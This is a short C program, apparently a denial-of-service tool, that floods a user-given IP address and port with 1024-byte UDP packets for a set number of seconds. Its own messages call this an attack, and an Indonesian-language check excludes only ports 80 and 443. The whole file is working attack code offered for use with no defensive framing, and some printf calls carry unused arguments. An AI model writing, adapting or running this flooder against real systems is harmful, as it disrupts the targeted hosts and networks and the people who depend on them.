#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <time.h>

#define PACKET_SIZE 1024

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage : ./udp [ip] [port] [time]\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    if (port == 80 || port == 443) {
        printf("Error: Serangan ke port 80 dan 443 tidak diperbolehkan!\n");
        return 1;
    }

    int sockfd;
    struct sockaddr_in target_addr;
    char packet[PACKET_SIZE];

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return 1;
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(target_ip);

    memset(packet, 'A', PACKET_SIZE);

    printf("Starting Flooding!!", target_ip, port, duration);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sendto(sockfd, packet, PACKET_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    printf("Attack finished.\n");

    close(sockfd);
    return 0;
}
